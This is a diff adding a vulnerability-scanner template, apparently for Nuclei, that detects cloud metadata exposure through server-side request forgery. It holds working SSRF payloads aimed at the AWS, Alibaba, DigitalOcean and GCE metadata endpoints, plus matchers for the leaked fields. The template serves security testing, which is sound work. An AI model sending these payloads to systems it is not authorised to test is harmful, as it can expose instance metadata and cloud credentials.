@@ -1,0 +1,30 @@
+id: cloud-metadata-leak
+
+info:
+  name: Cloud Metadata Leak via SSRF
+  author: Jake Lo.ai
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      # AWS
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      # Alibaba
+      - "{{BaseURL}}/?url=http://100.100.100.200/latest/meta-data/"
+      # DigitalOcean
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/v1.json"
+      # GCE
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json"
+
+    headers:
+      Metadata-Flavor: "Google"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "computeMetadata"
+          - "droplet_id"
